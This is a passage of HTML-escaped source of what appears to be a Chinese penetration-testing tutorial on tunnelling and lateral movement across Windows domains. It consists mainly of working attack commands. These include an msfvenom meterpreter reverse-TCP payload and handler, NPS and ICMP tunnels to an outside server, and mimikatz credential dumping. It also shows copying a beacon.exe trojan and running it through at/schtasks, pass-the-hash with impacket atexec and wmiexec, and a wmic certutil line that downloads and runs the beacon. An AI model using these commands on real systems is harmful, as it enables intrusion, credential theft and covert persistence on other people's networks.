exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LHOST 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LPORT 5555&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;nps上线内网机器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nps上线内网机器&#34;&gt;#&lt;/a&gt; Nps 上线内网机器&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务端启动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./nps install &amp;amp;&amp;amp; ./nps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;访问：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://IP:8080/ admin/123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建客户端，生成密匙&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./npc -server=47.94.236.117:8024 -vkey=uajwhbu9155qh89v&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf生成木马，远程绑定5555,指向本地 6666&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=5555 - f exe -o nps.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LHOST 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set LPORT 6666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;spp上线内网机器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#spp上线内网机器&#34;&gt;#&lt;/a&gt; Spp 上线内网机器&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务端：监听本地的icmp数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./spp -type server -proto ricmp -listen 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;客户端：将本地的 8082 给到 117 这 8081 上（TCP封装icmp）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;spp -name &amp;quot;test&amp;quot; -type proxy_client -server 47.94.236.117 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CS配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听器 1 ：http 47.94.236.117 8081&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听器 2 ：http 127.0.0.1 8082 - 生成后门&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;横向渗透技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#横向渗透技术&#34;&gt;#&lt;/a&gt; 横向渗透技术&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;域信息收集&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用cs脚本收集是否存在域，域内用户，端口开放情况，明文和&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user /domain （cs使用时需要在命令前加shell）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz logonpasswords&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ladon Adfinder BloodHound&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ipc-横向移动&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ipc-横向移动&#34;&gt;#&lt;/a&gt; IPC 横向移动&lt;/h4&gt;
&lt;p&gt;IPC 是专用管道，可以实现对远程计算机的访问，需要使用目标系统用户的账号密码，使用 139 、 445 端口。&lt;/p&gt;
&lt;p&gt;（ 1 ）IPC 上线的使用流程&lt;/p&gt;
&lt;p&gt;建立 IPC 链接到目标主机、拷贝要执行的命令脚本到目标主机、查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本、删除 IPC 链接&lt;/p&gt;
&lt;p&gt;（ 2 ）IPC 使用时需要的命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;工作组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\server\ipc$ &amp;quot;password&amp;quot; /user:username &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;域内&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\server\ipc$ &amp;quot;password&amp;quot; /user:domain\username &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看文件列表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\xx.xx.xx.xx\C$\ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy \\xx.xx.xx.xx\C$\1.bat 1.bat &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;复制文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy 1.bat \\xx.xx.xx.xx\C$ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;删除IPC&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\xx.xx.xx.xx\C$\1.bat /del &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看对方共享&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net view xx.xx.xx.xx &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）建立 IPC 失败的原因&lt;/p&gt;
&lt;p&gt;目标系统不是 NT 或以上的操作系统、对方没有打开 IPC$ 共享、对方未开启 139、445 端口，或者被防火墙屏蔽、输出命令、账号密码有错误&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IPC 渗透完整流程&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上线配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;正向：配置监听器beacon_bind_tcp并生成木马，木马运行连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connect 192.168.3.32 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;反向：选择需要转发的已经控制的肉鸡，代理转发-&amp;gt;转发上线-&amp;gt;beacon.exe&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Windows2012以下采用at命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\192.168.3.21\ipc$ &amp;quot;Admin12345&amp;quot; /user:god.org\administrator # 建立ipc连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy beacon.exe \\192.168.3.21\c$ #拷贝执行文件到目标机器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;at \\192.168.3.21 15:47 c:\beacon.exe #添加计划任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 计划任务执行后，木马被执行，在cs上会上线&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Windows2012及其以上采用schtasks命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\192.168.3.32\ipc$ &amp;quot;admin!@#45&amp;quot; /user:god.org\administrator # 建立ipc连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy beacon.exe \\192.168.3.32\c$ #复制文件到其C盘&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;schtasks /create /s 192.168.3.32 /ru &amp;quot;SYSTEM&amp;quot; /tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;schtasks /delete /s 192.168.3.21 /tn beacon /f#删除beacon任务&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Impacket-Atexec 套件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该工具是一个半交互的工具，适用于 Webshell 下，Socks 代理下；在渗透利 用中可以收集用户名、明文密码、密码 hash、远程主机等做成字典，批量测试。 一般选择 py 程序，比较轻量，体积较小，不易被识别。需要编写脚本进行批量 通过 IPC 通道下载木马，执行木马，针对不同的用户名，密码，hash 尝试。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py版：https://github.com/SecureAuthCorp/impacket&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python atexec.py god/administrator:Admin12345@192.168.3.21 &amp;quot;ver&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python atexec.py -hashes :ccef208c648* ./administrator@192.168.3.21 &amp;quot;v&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Exe版：https://gitee.com/RichChigga/impacket-examples-windows&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CS本地用户明文连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell atexec.exe ./administrator:Admin12345@192.168.3.21 &amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CS域内用户明文连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell atexec.exe god/administrator:Admin12345@192.168.3.21 &amp;quot;ver&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CS域内本地用户明文密文连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell atexec.exe - hashes :ccef208c648526* ./administrator@192.168.3.21 &amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell atexec.exe - hashes :ccef208c648526* god/administrator@192.168.3.21 &amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;wmi-横向渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wmi-横向渗透&#34;&gt;#&lt;/a&gt; WMI 横向渗透&lt;/h4&gt;
&lt;p&gt;WMI 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;wmic 内部：(单执行，只能用明文密码)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call create &amp;quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe &amp;amp; c:/beacon.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;cscript 内置：(生成交互式shell)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;先上传wmiexec.vbs至肉机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Impacket-Wmiexec 套件&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过明文密码或者&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;执行命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmiexec ./administrator:admin!@#45@192.168.3.32 &amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmiexec -hashes :518b98ad4178a ./administrator@192.168.3.32 &amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta 